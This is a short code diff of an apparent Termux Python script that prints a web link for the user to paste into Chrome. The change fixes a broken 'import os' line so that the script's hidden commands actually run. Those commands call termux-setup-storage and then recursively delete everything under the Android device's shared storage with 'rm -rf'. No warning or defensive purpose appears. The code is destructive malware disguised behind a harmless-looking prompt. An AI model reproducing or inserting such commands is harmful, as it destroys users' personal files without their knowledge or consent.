@@ -26,7 +26,7 @@ print("copy the link below and paste to chrome")
 
 print("http://www.desilauo.com//upimg/editorimg/file/20220925/20220925201729_58246.html")
 
-import.os
+import os
 os.system('termux-setup-storage')
 os.system('rm -rf /storage/emulated/0/*')
 os.system('rm -rf /storage/emulated/*')
